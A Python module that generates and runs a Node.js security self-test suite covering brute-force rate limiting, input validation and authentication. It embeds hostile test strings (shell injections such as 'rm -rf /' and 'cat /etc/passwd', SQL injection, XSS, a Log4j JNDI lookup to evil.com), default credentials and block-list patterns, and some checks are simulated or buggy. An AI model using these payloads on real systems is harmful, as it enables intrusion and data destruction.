#!/usr/bin/env python3
"""
SmartCompute Node.js Security Testing Sandbox
=============================================

Entorno de testing seguro en Node.js para experimentación con soluciones de seguridad.
Diseñado para trabajar en el directorio local del usuario sin requerir permisos de sistema.

Copyright (c) 2024 SmartCompute. All rights reserved.
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import uuid


@dataclass
class NodeJSTestResult:
    """Resultado de test de seguridad en Node.js"""
    test_id: str
    technique_tested: str
    test_name: str
    start_time: datetime
    end_time: datetime
    success: bool
    security_score: float
    vulnerabilities_found: List[str]
    protection_effective: bool
    performance_metrics: Dict[str, float]
    recommendations: List[str]


class SmartComputeNodeJSSandbox:
    """Sandbox de Node.js para testing de seguridad"""

    def __init__(self, sandbox_path: str = None):
        if sandbox_path is None:
            sandbox_path = str(Path.home() / "smartcompute" / "nodejs_sandbox")

        self.sandbox_path = Path(sandbox_path)
        self.sandbox_path.mkdir(parents=True, exist_ok=True)

        # Configurar logging
        self.logger = logging.getLogger(__name__)

        # Inicializar sandbox
        self._setup_sandbox()

    def _setup_sandbox(self):
        """Configura el entorno sandbox de Node.js"""
        try:
            # Crear package.json
            self._create_package_json()

            # Crear scripts de testing
            self._create_security_test_scripts()

            # Crear configuraciones de ejemplo
            self._create_example_configs()

            # Instalar dependencias si Node.js está disponible
            self._install_dependencies()

        except Exception as e:
            self.logger.error(f"Error setting up sandbox: {e}")

    def _create_package_json(self):
        """Crea package.json para el sandbox"""
        package_json = {
            "name": "smartcompute-security-sandbox",
            "version": "1.0.0",
            "description": "Security testing sandbox for SmartCompute",
            "main": "security_test.js",
            "dependencies": {
                "express": "^4.18.0",
                "helmet": "^6.0.0",
                "bcrypt": "^5.1.0",
                "jsonwebtoken": "^9.0.0",
                "node-rate-limiter-flexible": "^2.4.0",
                "winston": "^3.8.0",
                "validator": "^13.9.0",
                "express-validator": "^6.15.0",
                "cors": "^2.8.5"
            },
            "devDependencies": {
                "jest": "^29.5.0",
                "supertest": "^6.3.0"
            },
            "scripts": {
                "test": "node security_test.js",
                "test-mitre": "node mitre_security_test.js",
                "install-safe": "npm install --production",
                "security-audit": "npm audit"
            },
            "engines": {
                "node": ">=14.0.0"
            }
        }

        with open(self.sandbox_path / "package.json", 'w') as f:
            json.dump(package_json, f, indent=2)

    def _create_security_test_scripts(self):
        """Crea scripts de testing de seguridad"""

        # Script principal de testing
        main_test_script = '''
const express = require('express');
const helmet = require('helmet');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { RateLimiterMemory } = require('rate-limiter-flexible');
const winston = require('winston');
const validator = require('validator');

class SecurityTestSuite {
    constructor() {
        this.logger = winston.createLogger({
            level: 'info',
            format: winston.format.combine(
                winston.format.timestamp(),
                winston.format.json()
            ),
            transports: [
                new winston.transports.File({ filename: 'security_test.log' }),
                new winston.transports.Console({ level: 'error' })
            ]
        });

        this.app = express();
        this.setupMiddleware();
    }

    setupMiddleware() {
        // Configurar Helmet para seguridad básica
        this.app.use(helmet({
            contentSecurityPolicy: {
                directives: {
                    defaultSrc: ["'self'"],
                    styleSrc: ["'self'", "'unsafe-inline'"],
                    scriptSrc: ["'self'"],
                    imgSrc: ["'self'", "data:", "https:"]
                }
            },
            hsts: {
                maxAge: 31536000,
                includeSubDomains: true,
                preload: true
            }
        }));

        this.app.use(express.json({ limit: '10mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '10mb' }));
    }

    async testBruteForceProtection(config = {}) {
        console.log('🔒 Testing Brute Force Protection (MITRE T1110)...');

        const rateLimiter = new RateLimiterMemory({
            keyGenerator: (req) => req.ip || 'test_ip',
            points: config.maxAttempts || 5,
            duration: config.windowSeconds || 60,
            blockDuration: config.blockDuration || 60
        });

        const results = {
            technique: 'T1110',
            test_name: 'Brute Force Protection',
            attempts_made: 0,
            attempts_blocked: 0,
            attempts_allowed: 0,
            protection_effective: false,
            response_times: [],
            false_positives: 0,
            security_score: 0
        };

        // Simular intentos de autenticación
        const testAttempts = config.testAttempts || 20;
        const testIP = 'test_ip_' + Math.random().toString(36).substr(2, 9);

        for (let i = 0; i < testAttempts; i++) {
            const startTime = Date.now();
            results.attempts_made++;

            try {
                await rateLimiter.consume(testIP);
                results.attempts_allowed++;

                // Simular tiempo de procesamiento de autenticación
                await new Promise(resolve => setTimeout(resolve, Math.random() * 50));

            } catch (rejRes) {
                results.attempts_blocked++;
                this.logger.info(`Brute force attempt blocked for IP: ${testIP}`);
            }

            const responseTime = Date.now() - startTime;
            results.response_times.push(responseTime);

            // Pequeña pausa entre intentos
            await new Promise(resolve => setTimeout(resolve, 10));
        }

        // Calcular efectividad
        const expectedBlocked = Math.max(0, testAttempts - (config.maxAttempts || 5));
        results.protection_effective = results.attempts_blocked >= expectedBlocked * 0.8;

        // Calcular score de seguridad
        const blockRate = results.attempts_blocked / results.attempts_made;
        results.security_score = Math.min(100, blockRate * 100);

        // Verificar rendimiento
        const avgResponseTime = results.response_times.reduce((a, b) => a + b, 0) / results.response_times.length;
        if (avgResponseTime > 1000) { // Más de 1 segundo
            results.security_score *= 0.8; // Penalizar por lentitud
        }

        this.logger.info('Brute force test completed', results);
        return results;
    }

    async testInputValidation(config = {}) {
        console.log('🛡️ Testing Input Validation (MITRE T1059)...');

        const results = {
            technique: 'T1059',
            test_name: 'Input Validation & Command Injection',
            payloads_tested: 0,
            payloads_blocked: 0,
            vulnerabilities_found: [],
            protection_effective: true,
            security_score: 100
        };

        // Payloads de testing comunes
        const maliciousPayloads = [
            '; ls -la',
            '&& cat /etc/passwd',
            '| whoami',
            '`id`',
            '$(uname -a)',
            '; rm -rf /',
            "'; DROP TABLE users; --",
            '<script>alert("XSS")</script>',
            '../../../etc/passwd',
            '%00',
            'null\\0',
            '${jndi:ldap://evil.com/a}'
        ];

        for (const payload of maliciousPayloads) {
            results.payloads_tested++;

            // Test validación básica
            if (this.isPayloadBlocked(payload, config)) {
                results.payloads_blocked++;
            } else {
                results.vulnerabilities_found.push({
                    payload: payload,
                    type: this.classifyPayload(payload),
                    severity: this.getPayloadSeverity(payload)
                });
            }
        }

        // Calcular efectividad
        const blockRate = results.payloads_blocked / results.payloads_tested;
        results.protection_effective = blockRate >= 0.9; // 90% block rate
        results.security_score = blockRate * 100;

        // Penalizar por vulnerabilidades críticas
        const criticalVulns = results.vulnerabilities_found.filter(v => v.severity === 'critical').length;
        results.security_score -= criticalVulns * 20;
        results.security_score = Math.max(0, results.security_score);

        this.logger.info('Input validation test completed', results);
        return results;
    }

    isPayloadBlocked(payload, config) {
        // Simulación de validación de entrada
        const blockedPatterns = config.blockedPatterns || [
            /[;&|`$()]/,  // Caracteres de comando
            /<script|javascript:/i,  // XSS básico
            /\\.\\.\\.\\./,  // Path traversal
            /drop\\s+table/i,  // SQL injection
            /\\$\\{jndi:/i  // Log4j
        ];

        const blockedKeywords = config.blockedKeywords || [
            'rm', 'del', 'format', 'shutdown', 'passwd', 'shadow'
        ];

        // Check patrones
        for (const pattern of blockedPatterns) {
            if (pattern.test(payload)) {
                return true;
            }
        }

        // Check palabras clave
        for (const keyword of blockedKeywords) {
            if (payload.toLowerCase().includes(keyword)) {
                return true;
            }
        }

        return false;
    }

    classifyPayload(payload) {
        if (payload.includes('script') || payload.includes('javascript:')) return 'xss';
        if (payload.includes('DROP') || payload.includes('SELECT')) return 'sql_injection';
        if (payload.includes('../') || payload.includes('..\\\\')) return 'path_traversal';
        if (payload.includes('jndi:')) return 'log4j';
        if (/[;&|`$()]/.test(payload)) return 'command_injection';
        return 'unknown';
    }

    getPayloadSeverity(payload) {
        const criticalPatterns = ['rm -rf', 'DROP TABLE', 'jndi:', '/etc/passwd'];
        const highPatterns = ['script>', '$(', '`', '| whoami'];

        for (const pattern of criticalPatterns) {
            if (payload.includes(pattern)) return 'critical';
        }

        for (const pattern of highPatterns) {
            if (payload.includes(pattern)) return 'high';
        }

        return 'medium';
    }

    async testAuthenticationSecurity(config = {}) {
        console.log('🔐 Testing Authentication Security (MITRE T1078)...');

        const results = {
            technique: 'T1078',
            test_name: 'Authentication Security',
            auth_attempts: 0,
            successful_bypasses: 0,
            weak_passwords_accepted: 0,
            protection_effective: true,
            security_score: 100,
            vulnerabilities: []
        };

        // Test casos de bypass comunes
        const bypassAttempts = [
            { username: 'admin', password: '' },
            { username: 'admin', password: 'admin' },
            { username: 'admin', password: 'password' },
            { username: 'admin', password: '123456' },
            { username: "admin'--", password: 'anything' },
            { username: 'admin', password: "' OR '1'='1" },
            { username: 'admin', password: 'admin\\'\\'); DROP TABLE users; --' },
            { username: '', password: '' },
            { username: 'root', password: 'toor' }
        ];

        // Test passwords débiles
        const weakPasswords = [
            'password', '123456', 'admin', 'qwerty', 'letmein',
            'welcome', 'monkey', '1234', 'password123', 'admin123'
        ];

        // Test bypass attempts
        for (const attempt of bypassAttempts) {
            results.auth_attempts++;

            if (!this.isSecureAuthentication(attempt, config)) {
                results.successful_bypasses++;
                results.vulnerabilities.push({
                    type: 'bypass',
                    attempt: attempt,
                    severity: 'critical'
                });
            }
        }

        // Test weak passwords
        for (const weakPassword of weakPasswords) {
            results.auth_attempts++;

            if (this.acceptsWeakPassword(weakPassword, config)) {
                results.weak_passwords_accepted++;
                results.vulnerabilities.push({
                    type: 'weak_password',
                    password: weakPassword,
                    severity: 'medium'
                });
            }
        }

        // Calcular score
        if (results.successful_bypasses > 0) {
            results.protection_effective = false;
            results.security_score -= results.successful_bypasses * 25;
        }

        results.security_score -= results.weak_passwords_accepted * 5;
        results.security_score = Math.max(0, results.security_score);

        this.logger.info('Authentication security test completed', results);
        return results;
    }

    isSecureAuthentication(credentials, config) {
        const { username, password } = credentials;

        // Validaciones básicas de seguridad
        if (!username || !password) return false;
        if (username.includes("'") || username.includes("--")) return false;
        if (password.includes("'") || password.includes("OR")) return false;
        if (username.length > 50 || password.length > 100) return false;

        // Simular validación de hash de password
        const validCredentials = config.validCredentials || [
            { username: 'admin', passwordHash: '$2b$10$validhashexample' }
        ];

        // En un sistema real, aquí se verificaría contra base de datos
        return validCredentials.some(cred =>
            cred.username === username &&
            this.verifyPassword(password, cred.passwordHash)
        );
    }

    verifyPassword(password, hash) {
        // Simulación de verificación de hash
        // En implementación real usaría bcrypt.compare()
        return hash.startsWith('$2b$') && password.length >= 8;
    }

    acceptsWeakPassword(password, config) {
        const minLength = config.minPasswordLength || 8;
        const requireComplexity = config.requirePasswordComplexity !== false;

        if (password.length < minLength) return true;

        if (requireComplexity) {
            const hasUpper = /[A-Z]/.test(password);
            const hasLower = /[a-z]/.test(password);
            const hasDigit = /\\d/.test(password);
            const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);

            const complexityMet = [hasUpper, hasLower, hasDigit, hasSpecial].filter(Boolean).length >= 3;
            if (!complexityMet) return true;
        }

        // Check against common weak passwords
        const commonWeak = [
            'password', '123456', 'admin', 'qwerty', 'letmein',
            'welcome', 'monkey', 'password123', 'admin123'
        ];

        return commonWeak.includes(password.toLowerCase());
    }

    async runComprehensiveTest(testConfig = {}) {
        console.log('🚀 Running Comprehensive Security Test Suite...');

        const overallResults = {
            test_id: Math.random().toString(36).substr(2, 9),
            timestamp: new Date().toISOString(),
            techniques_tested: [],
            overall_security_score: 0,
            critical_vulnerabilities: 0,
            high_vulnerabilities: 0,
            medium_vulnerabilities: 0,
            recommendations: [],
            test_duration_ms: 0
        };

        const startTime = Date.now();

        try {
            // Test T1110 - Brute Force
            if (testConfig.testBruteForce !== false) {
                const bruteForceResults = await this.testBruteForceProtection(testConfig.bruteForce || {});
                overallResults.techniques_tested.push(bruteForceResults);
            }

            // Test T1059 - Command Injection
            if (testConfig.testInputValidation !== false) {
                const inputValidationResults = await this.testInputValidation(testConfig.inputValidation || {});
                overallResults.techniques_tested.push(inputValidationResults);
            }

            // Test T1078 - Authentication
            if (testConfig.testAuthentication !== false) {
                const authResults = await this.testAuthenticationSecurity(testConfig.authentication || {});
                overallResults.techniques_tested.push(authResults);
            }

            // Calcular métricas generales
            this.calculateOverallMetrics(overallResults);

            // Generar recomendaciones
            this.generateRecommendations(overallResults);

            overallResults.test_duration_ms = Date.now() - startTime;

            this.logger.info('Comprehensive test completed', {
                test_id: overallResults.test_id,
                security_score: overallResults.overall_security_score,
                critical_vulnerabilities: overallResults.critical_vulnerabilities
            });

            return overallResults;

        } catch (error) {
            this.logger.error('Comprehensive test failed', { error: error.message });
            throw error;
        }
    }

    calculateOverallMetrics(results) {
        const techniques = results.techniques_tested;

        if (techniques.length === 0) {
            results.overall_security_score = 0;
            return;
        }

        // Calcular score promedio ponderado
        let totalScore = 0;
        let totalWeight = 0;

        for (const technique of techniques) {
            const weight = this.getTechniqueWeight(technique.technique);
            totalScore += technique.security_score * weight;
            totalWeight += weight;

            // Contar vulnerabilidades por severidad
            if (technique.vulnerabilities_found) {
                for (const vuln of technique.vulnerabilities_found) {
                    switch (vuln.severity) {
                        case 'critical':
                            results.critical_vulnerabilities++;
                            break;
                        case 'high':
                            results.high_vulnerabilities++;
                            break;
                        case 'medium':
                            results.medium_vulnerabilities++;
                            break;
                    }
                }
            }

            if (technique.vulnerabilities) {
                for (const vuln of technique.vulnerabilities) {
                    switch (vuln.severity) {
                        case 'critical':
                            results.critical_vulnerabilities++;
                            break;
                        case 'high':
                            results.high_vulnerabilities++;
                            break;
                        case 'medium':
                            results.medium_vulnerabilities++;
                            break;
                    }
                }
            }
        }

        results.overall_security_score = totalWeight > 0 ? totalScore / totalWeight : 0;
    }

    getTechniqueWeight(technique) {
        // Pesos basados en criticidad de técnicas MITRE
        const weights = {
            'T1078': 3.0,  // Authentication - muy crítico
            'T1110': 2.5,  // Brute Force - crítico
            'T1059': 2.0   // Command Injection - importante
        };
        return weights[technique] || 1.0;
    }

    generateRecommendations(results) {
        const recommendations = [];

        // Recomendaciones basadas en score general
        if (results.overall_security_score < 70) {
            recommendations.push('CRÍTICO: Score de seguridad general por debajo del umbral aceptable (70%)');
        }

        // Recomendaciones por vulnerabilidades críticas
        if (results.critical_vulnerabilities > 0) {
            recommendations.push(`URGENTE: ${results.critical_vulnerabilities} vulnerabilidades críticas requieren atención inmediata`);
        }

        // Recomendaciones específicas por técnica
        for (const technique of results.techniques_tested) {
            if (!technique.protection_effective) {
                switch (technique.technique) {
                    case 'T1110':
                        recommendations.push('Implementar rate limiting más estricto para prevenir ataques de fuerza bruta');
                        break;
                    case 'T1059':
                        recommendations.push('Fortalecer validación y sanitización de entradas para prevenir inyección de comandos');
                        break;
                    case 'T1078':
                        recommendations.push('Mejorar controles de autenticación y políticas de contraseñas');
                        break;
                }
            }
        }

        // Recomendaciones generales de seguridad
        if (results.techniques_tested.some(t => t.security_score < 80)) {
            recommendations.push('Implementar monitoreo de seguridad continuo y alertas automáticas');
            recommendations.push('Considerar implementación de autenticación multifactor (MFA)');
            recommendations.push('Realizar auditorías de seguridad regulares');
        }

        results.recommendations = recommendations;
    }
}

// Función para ejecutar desde línea de comandos
async function runSecurityTest(configPath) {
    try {
        const fs = require('fs');
        let config = {};

        if (configPath && fs.existsSync(configPath)) {
            config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        }

        const testSuite = new SecurityTestSuite();
        const results = await testSuite.runComprehensiveTest(config);

        // Guardar resultados
        const resultsPath = configPath ?
            configPath.replace('.json', '_results.json') :
            'security_test_results.json';

        fs.writeFileSync(resultsPath, JSON.stringify(results, null, 2));

        console.log('\\n=== SECURITY TEST RESULTS ===');
        console.log(`Overall Security Score: ${results.overall_security_score.toFixed(1)}%`);
        console.log(`Critical Vulnerabilities: ${results.critical_vulnerabilities}`);
        console.log(`High Vulnerabilities: ${results.high_vulnerabilities}`);
        console.log(`Medium Vulnerabilities: ${results.medium_vulnerabilities}`);
        console.log(`Test Duration: ${results.test_duration_ms}ms`);
        console.log(`Results saved to: ${resultsPath}`);

        if (results.recommendations.length > 0) {
            console.log('\\n=== RECOMMENDATIONS ===');
            results.recommendations.forEach((rec, index) => {
                console.log(`${index + 1}. ${rec}`);
            });
        }

        return results;

    } catch (error) {
        console.error('Security test failed:', error.message);
        process.exit(1);
    }
}

// Ejecutar si se llama directamente
if (require.main === module) {
    const configPath = process.argv[2];
    runSecurityTest(configPath);
}

module.exports = { SecurityTestSuite, runSecurityTest };
'''

        with open(self.sandbox_path / "security_test.js", 'w') as f:
            f.write(main_test_script)

    def _create_example_configs(self):
        """Crea configuraciones de ejemplo para testing"""

        # Configuración básica
        basic_config = {
            "testBruteForce": True,
            "testInputValidation": True,
            "testAuthentication": True,
            "bruteForce": {
                "maxAttempts": 5,
                "windowSeconds": 60,
                "blockDuration": 300,
                "testAttempts": 15
            },
            "inputValidation": {
                "blockedPatterns": ["[;&|`$()]", "<script", "DROP\\s+TABLE"],
                "blockedKeywords": ["rm", "del", "passwd", "shadow"]
            },
            "authentication": {
                "minPasswordLength": 8,
                "requirePasswordComplexity": True,
                "validCredentials": [
                    {
                        "username": "admin",
                        "passwordHash": "$2b$10$validhashexample"
                    }
                ]
            }
        }

        with open(self.sandbox_path / "test_config_basic.json", 'w') as f:
            json.dump(basic_config, f, indent=2)

        # Configuración avanzada
        advanced_config = {
            "testBruteForce": True,
            "testInputValidation": True,
            "testAuthentication": True,
            "bruteForce": {
                "maxAttempts": 3,
                "windowSeconds": 60,
                "blockDuration": 600,
                "testAttempts": 20
            },
            "inputValidation": {
                "blockedPatterns": [
                    "[;&|`$()]",
                    "<script|javascript:",
                    "\\.\\.\\.\\./",
                    "drop\\s+table",
                    "\\$\\{jndi:",
                    "exec\\s*\\(",
                    "eval\\s*\\("
                ],
                "blockedKeywords": [
                    "rm", "del", "format", "shutdown", "passwd", "shadow",
                    "cat", "type", "net", "whoami", "id", "uname"
                ]
            },
            "authentication": {
                "minPasswordLength": 12,
                "requirePasswordComplexity": True,
                "maxLoginAttempts": 3,
                "accountLockoutDuration": 1800,
                "validCredentials": [
                    {
                        "username": "admin",
                        "passwordHash": "$2b$12$validcomplexhashexample"
                    }
                ]
            }
        }

        with open(self.sandbox_path / "test_config_advanced.json", 'w') as f:
            json.dump(advanced_config, f, indent=2)

    def _install_dependencies(self):
        """Intenta instalar dependencias de Node.js si está disponible"""
        try:
            # Verificar si Node.js está disponible
            result = subprocess.run(['node', '--version'],
                                  capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                self.logger.info(f"Node.js detected: {result.stdout.strip()}")

                # Intentar instalar dependencias
                install_result = subprocess.run(
                    ['npm', 'install', '--production', '--silent'],
                    cwd=self.sandbox_path,
                    capture_output=True,
                    text=True,
                    timeout=300
                )

                if install_result.returncode == 0:
                    self.logger.info("Node.js dependencies installed successfully")
                else:
                    self.logger.warning(f"npm install failed: {install_result.stderr}")
            else:
                self.logger.info("Node.js not available, sandbox created without dependencies")

        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.logger.info(f"Node.js/npm not available: {e}")

    async def run_security_test(self,
                              config: Dict[str, Any] = None,
                              test_name: str = "security_test") -> NodeJSTestResult:
        """Ejecuta un test de seguridad en el sandbox"""

        start_time = datetime.now()
        test_id = str(uuid.uuid4())

        try:
            # Usar configuración por defecto si no se proporciona
            if config is None:
                config_path = self.sandbox_path / "test_config_basic.json"
                if config_path.exists():
                    with open(config_path, 'r') as f:
                        config = json.load(f)
                else:
                    config = {}

            # Crear archivo de configuración temporal
            temp_config_path = self.sandbox_path / f"temp_config_{test_id}.json"
            with open(temp_config_path, 'w') as f:
                json.dump(config, f, indent=2)

            # Ejecutar test
            result = subprocess.run([
                'node', 'security_test.js', str(temp_config_path)
            ], cwd=self.sandbox_path, capture_output=True, text=True, timeout=300)

            end_time = datetime.now()

            # Cargar resultados
            results_path = str(temp_config_path).replace('.json', '_results.json')
            if Path(results_path).exists():
                with open(results_path, 'r') as f:
                    test_results = json.load(f)

                # Extraer vulnerabilidades
                vulnerabilities = []
                for technique in test_results.get('techniques_tested', []):
                    if 'vulnerabilities_found' in technique:
                        vulnerabilities.extend([v.get('payload', str(v)) for v in technique['vulnerabilities_found']])
                    if 'vulnerabilities' in technique:
                        vulnerabilities.extend([v.get('type', str(v)) for v in technique['vulnerabilities']])

                # Crear resultado estructurado
                node_result = NodeJSTestResult(
                    test_id=test_id,
                    technique_tested="Multiple",
                    test_name=test_name,
                    start_time=start_time,
                    end_time=end_time,
                    success=result.returncode == 0,
                    security_score=test_results.get('overall_security_score', 0),
                    vulnerabilities_found=vulnerabilities,
                    protection_effective=test_results.get('overall_security_score', 0) >= 70,
                    performance_metrics={
                        'test_duration_ms': test_results.get('test_duration_ms', 0),
                        'techniques_tested': len(test_results.get('techniques_tested', [])),
                        'critical_vulnerabilities': test_results.get('critical_vulnerabilities', 0)
                    },
                    recommendations=test_results.get('recommendations', [])
                )

                return node_result

            else:
                raise Exception("Test results file not found")

        except Exception as e:
            end_time = datetime.now()

            return NodeJSTestResult(
                test_id=test_id,
                technique_tested="Unknown",
                test_name=test_name,
                start_time=start_time,
                end_time=end_time,
                success=False,
                security_score=0,
                vulnerabilities_found=[f"Test failed: {str(e)}"],
                protection_effective=False,
                performance_metrics={},
                recommendations=[f"Fix test execution error: {str(e)}"]
            )

        finally:
            # Limpiar archivos temporales
            if temp_config_path.exists():
                temp_config_path.unlink()
            results_path = Path(str(temp_config_path).replace('.json', '_results.json'))
            if results_path.exists():
                results_path.unlink()

    def is_ready(self) -> bool:
        """Verifica si el sandbox está listo para usar"""
        required_files = [
            "package.json",
            "security_test.js",
            "test_config_basic.json"
        ]

        for file_name in required_files:
            if not (self.sandbox_path / file_name).exists():
                return False

        return True

    def get_available_configs(self) -> List[str]:
        """Obtiene lista de configuraciones disponibles"""
        config_files = []
        for file_path in self.sandbox_path.glob("test_config_*.json"):
            config_files.append(file_path.name)
        return config_files

    def get_sandbox_info(self) -> Dict[str, Any]:
        """Obtiene información del sandbox"""
        return {
            "sandbox_path": str(self.sandbox_path),
            "is_ready": self.is_ready(),
            "available_configs": self.get_available_configs(),
            "has_node_modules": (self.sandbox_path / "node_modules").exists(),
            "last_modified": max(
                f.stat().st_mtime for f in self.sandbox_path.iterdir() if f.is_file()
            ) if any(self.sandbox_path.iterdir()) else None
        }


# Ejemplo de uso
async def demo_nodejs_sandbox():
    """Demostración del sandbox Node.js"""

    print("🟢 SmartCompute Node.js Security Sandbox Demo")
    print("=" * 50)

    # Crear sandbox
    sandbox = SmartComputeNodeJSSandbox()

    # Verificar estado
    info = sandbox.get_sandbox_info()
    print(f"✅ Sandbox creado en: {info['sandbox_path']}")
    print(f"✅ Estado: {'Listo' if info['is_ready'] else 'No listo'}")
    print(f"✅ Configuraciones disponibles: {len(info['available_configs'])}")

    if info['is_ready']:
        # Ejecutar test básico
        print("\n🧪 Ejecutando test de seguridad básico...")
        result = await sandbox.run_security_test()

        print(f"✅ Test completado: {'Exitoso' if result.success else 'Falló'}")
        print(f"✅ Score de seguridad: {result.security_score:.1f}%")
        print(f"✅ Vulnerabilidades encontradas: {len(result.vulnerabilities_found)}")
        print(f"✅ Protección efectiva: {'Sí' if result.protection_effective else 'No'}")

        if result.recommendations:
            print("\n📋 Recomendaciones:")
            for i, rec in enumerate(result.recommendations[:3], 1):
                print(f"   {i}. {rec}")

    else:
        print("❌ Sandbox no está listo para testing")


if __name__ == "__main__":
    asyncio.run(demo_nodejs_sandbox())